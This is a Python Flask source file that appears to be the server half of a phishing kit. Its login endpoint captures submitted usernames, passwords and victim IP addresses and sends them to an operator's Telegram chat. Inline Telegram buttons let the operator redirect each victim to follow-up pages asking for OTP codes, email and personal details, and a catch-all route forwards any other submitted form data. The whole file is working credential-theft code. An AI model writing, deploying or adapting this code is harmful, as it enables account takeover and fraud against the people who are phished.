from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import uuid
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

# Telegram Bot Info
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID.")

# Session status memory
session_store = {}  # Example: { "uuid123": "pending" or "approved" }

# Telegram inline buttons
REDIRECT_BUTTONS = [
    [
        {"text": "🔐 OTP", "callback_data": "redirect_otp"},
        {"text": "📧 Email", "callback_data": "redirect_email"},
        {"text": "🙍 Personal", "callback_data": "redirect_personal"},
    ],
    [
        {"text": "🔁 Login2", "callback_data": "redirect_login2"},
        {"text": "⚙️ Custom", "callback_data": "redirect_c"},
    ]
]

# ID-to-redirect mapping (for session approval)
id_redirect_map = {}  # Example: { "uuid123": "otp.html" }


# Helper: Send to Telegram
def send_to_telegram(message, session_id=None):
    reply_markup = {"inline_keyboard": REDIRECT_BUTTONS}
    if session_id:
        for row in reply_markup["inline_keyboard"]:
            for button in row:
                # Attach session ID to callback
                button["callback_data"] += f":{session_id}"

    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": reply_markup
    }

    try:
        res = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
        print("Telegram response:", res.status_code, res.text)
        return res.ok
    except Exception as e:
        print(f"Telegram error: {e}")
        return False


# Root Health Check
@app.route("/")
def root():
    return "✅ Server running"


# Login Endpoint
@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.get_json()
        login = data.get("login")
        password = data.get("password")
        if not login or not password:
            return jsonify({"success": False, "error": "Missing credentials"}), 400

        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        session_id = str(uuid.uuid4())
        session_store[session_id] = "pending"

        msg = f"""<b>🔐 LOGIN SUBMISSION</b>
<b>Login:</b> <code>{login}</code>
<b>Password:</b> <code>{password}</code>
<b>IP:</b> <code>{user_ip}</code>
🆔 <b>Session:</b> <code>{session_id}</code>"""

        send_to_telegram(msg, session_id=session_id)

        return jsonify({"success": True, "id": session_id}), 200
    except Exception as e:
        print("Login error:", e)
        return jsonify({"success": False, "error": "Internal error"}), 500


# Check status of session
@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    status = session_store.get(session_id, "pending")
    if status == "approved":
        redirect_url = id_redirect_map.get(session_id, "otp.html")
        return jsonify({"status": "approved", "redirect_url": redirect_url}), 200
    return jsonify({"status": "pending"}), 200


# Telegram Webhook
@app.route("/webhook", methods=["POST"])
def telegram_webhook():
    try:
        update = request.get_json()
        if "callback_query" not in update:
            return jsonify({"status": "ignored"}), 200

        callback_data = update["callback_query"]["data"]
        chat_id = update["callback_query"]["message"]["chat"]["id"]

        if ":" in callback_data:
            action, session_id = callback_data.split(":", 1)
            redirect_map = {
                "redirect_otp": "otp.html",
                "redirect_email": "email.html",
                "redirect_personal": "personal.html",
                "redirect_login2": "login2.html",
                "redirect_c": "c.html"
            }

            if action in redirect_map and session_id in session_store:
                session_store[session_id] = "approved"
                id_redirect_map[session_id] = redirect_map[action]
                ack = {
                    "chat_id": chat_id,
                    "text": f"✅ Approved session {session_id}\n➡️ Redirect to: {redirect_map[action]}",
                }
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=ack)
                return jsonify({"status": "ok"}), 200

        return jsonify({"status": "unknown"}), 200
    except Exception as e:
        print("Webhook error:", e)
        return jsonify({"status": "error"}), 500


# Generic page form submissions
@app.route("/<page>", methods=["POST"])
def catch_form(page):
    try:
        data = request.get_json() or request.form.to_dict()
        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        msg = [f"<b>📄 {page.upper()} FORM</b>"]
        for k, v in data.items():
            msg.append(f"<b>{k}:</b> <code>{v}</code>")
        msg.append(f"<b>IP:</b> <code>{user_ip}</code>")
        send_to_telegram("\n".join(msg))
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error in /{page}: {e}")
        return jsonify({"status": "error"}), 500


# Run app
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
